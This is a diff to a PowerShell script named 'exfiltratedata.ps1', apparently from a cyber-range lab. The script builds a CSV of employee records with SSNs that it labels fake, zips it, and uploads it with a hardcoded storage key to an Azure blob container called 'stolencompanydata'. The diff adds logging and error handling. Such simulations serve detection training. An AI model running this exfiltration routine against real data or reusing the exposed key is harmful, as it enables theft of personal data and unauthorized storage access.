@@ -1,4 +1,22 @@
-  # Define variables
+ # Define the log file path
+$logFile = "C:\ProgramData\entropygorilla.log"
+$scriptName = "exfiltratedata.ps1"
+
+# Function to log messages
+function Log-Message {
+    param (
+        [string]$message,
+        [string]$level = "INFO"
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logEntry = "$timestamp [$level] [$scriptName] $message"
+    Add-Content -Path $logFile -Value $logEntry
+}
+
+# Start logging
+Log-Message "Script execution started."
+
+# Define variables
 $currentDateTime = Get-Date -Format "yyyyMMddHHmmss"
 $filePath = "C:\ProgramData\employee-data-$($currentDateTime).csv"
 $tempFilePath = "C:\ProgramData\employee-data-temp$($currentDateTime).csv"
@@ -8,10 +26,11 @@ $zipFilePath = "C:\ProgramData\employee-data-$($currentDateTime).zip"  # Path fo
 if (Test-Path $filePath) {
     Remove-Item $filePath
     Write-Host "File deleted: $filePath"
+    Log-Message "Deleted existing file: $filePath"
 }
 
 # Create the employee data with fake information
-$employeeData = @"
+ $employeeData = @"
 $($currentDateTime)
 FirstName,LastName,SSN,PhoneNumber,Salary,DOB
 Travis,Ward,294-75-2745,(703)785-1895,79976.31,1984-11-10
@@ -47,41 +66,60 @@ Donald,Ramirez,151-11-4511,+1-950-537-3618x583,56339.03,1975-03-07
 "@
 
 # Write the employee data to the temporary CSV file
-$employeeData | Out-File -FilePath $tempFilePath -Encoding UTF8
+try {
+    $employeeData | Out-File -FilePath $tempFilePath -Encoding UTF8
+    Log-Message "Employee data written to temporary file: $tempFilePath"
+} catch {
+    Log-Message "Error writing employee data to $($tempFilePath): $_" "ERROR"
+}
 
 # Download 7zip
-Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile 'C:\programdata\7z2408-x64.exe'
+try {
+    Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile 'C:\ProgramData\7z2408-x64.exe'
+    Log-Message "Downloaded 7zip installer to C:\ProgramData\7z2408-x64.exe"
+} catch {
+    Log-Message "Error downloading 7zip: $_" "ERROR"
+}
 
 # Install 7zip silently
-Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait
+try {
+    Start-Process 'C:\ProgramData\7z2408-x64.exe' -ArgumentList '/S' -Wait
+    Log-Message "Installed 7zip successfully"
+} catch {
+    Log-Message "Error installing 7zip: $_" "ERROR"
+}
 
 Start-Sleep -Seconds 5
 
 # Use 7zip to zip the temporary CSV file
-& "C:\Program Files\7-Zip\7z.exe" a $zipFilePath $tempFilePath
-
-Write-Host "File zipped to: $zipFilePath"
+try {
+    & "C:\Program Files\7-Zip\7z.exe" a $zipFilePath $tempFilePath
+    Write-Host "File zipped to: $zipFilePath"
+    Log-Message "Zipped file to: $zipFilePath"
+} catch {
+    Log-Message "Error zipping file: $_" "ERROR"
+}
 
 # Define Azure Blob Storage variables
-$storageUrl = "https://sacyberrangedanger.blob.core.windows.net/stolencompanydata/employee-data.zip"  # Change to the zip file
+$storageUrl = "https://sacyberrangedanger.blob.core.windows.net/stolencompanydata/employee-data.zip"
 $storageAccount = "sacyberrangedanger"
 $storageKey = "p5s3pxy+U3VRp3c64ueC8FI87M8+SOWkQzUUiI20steaoowL4P8Rc3wNPL8VNYOSH/w3JSdCS4+c+ASt3tqNng=="
 $blobType = "BlockBlob"
 
 # Extract the container and blob name from the URL
 $containerName = "stolencompanydata"
-$blobName = "employee-data.zip"  # Change to the zip file
+$blobName = "employee-data.zip"
 
 # Define the date and headers
 $dateString = [DateTime]::UtcNow.ToString("R")
 $version = "2021-08-06"
 $contentType = "application/octet-stream"
-$fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)  # Read the zip file as a byte array
+$fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)
 $contentLength = $fileContent.Length
 
 # Construct the canonicalized resource and headers
-$canonicalizedResource = "/$storageAccount/$containerName/$blobName"
-$canonicalizedHeaders = "x-ms-blob-type:$blobType`nx-ms-date:$dateString`nx-ms-version:$version"
+$canonicalizedResource = "/$($storageAccount)/$($containerName)/$($blobName)"
+$canonicalizedHeaders = "x-ms-blob-type:$($blobType)`nx-ms-date:$($dateString)`nx-ms-version:$($version)"
 
 # Create the string to sign
 $stringToSign = "PUT`n`n`n$contentLength`n`n$contentType`n`n`n`n`n`n`n$canonicalizedHeaders`n$canonicalizedResource"
@@ -102,24 +140,41 @@ $headers = @{
     "Content-Type"     = $contentType
 }
 
-# Create some logs
-& cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Test-NetConnection sacyberrange00.blob.core.windows.net -Port 443
-
 # Upload the blob using Invoke-WebRequest
-Invoke-WebRequest -Uri $storageUrl -Method Put -Headers $headers -InFile $zipFilePath
+try {
+    Invoke-WebRequest -Uri $storageUrl -Method Put -Headers $headers -InFile $zipFilePath
+    Log-Message "Uploaded the zip file to Azure Blob Storage: $storageUrl"
+} catch {
+    Log-Message "Error uploading the zip file to Azure Blob Storage: $_" "ERROR"
+}
 
 # Define the backup directory
 $backupDir = "C:\ProgramData\backup"
 
 # Check if the backup directory exists, if not, create it
 if (-not (Test-Path $backupDir)) {
-    New-Item -Path $backupDir -ItemType Directory
-    Write-Host "Backup directory created: $backupDir"
+    try {
+        New-Item -Path $backupDir -ItemType Directory
+        Write-Host "Backup directory created: $backupDir"
+        Log-Message "Backup directory created: $backupDir"
+    } catch {
+        Log-Message "Error creating backup directory: $_" "ERROR"
+    }
 }
 
 # Move the zipped folder and CSV file to the backup directory
-Move-Item -Path $zipFilePath -Destination $backupDir
-Write-Host "Zipped file moved to: $backupDir"
+try {
+    Move-Item -Path $zipFilePath -Destination $backupDir
+    Write-Host "Zipped file moved to: $backupDir"
+    Log-Message "Zipped file moved to: $backupDir"
 
-Move-Item -Path $tempFilePath -Destination $backupDir
-Write-Host "CSV file moved to: $backupDir"
+    Move-Item -Path $tempFilePath -Destination $backupDir
+    Write-Host "CSV file moved to: $backupDir"
+    Log-Message "CSV file moved to: $backupDir"
+} catch {
+    Log-Message "Error moving files to backup directory: $($_)" "ERROR"
+}
+
+# End logging
+Log-Message "Script execution completed successfully."
+ 
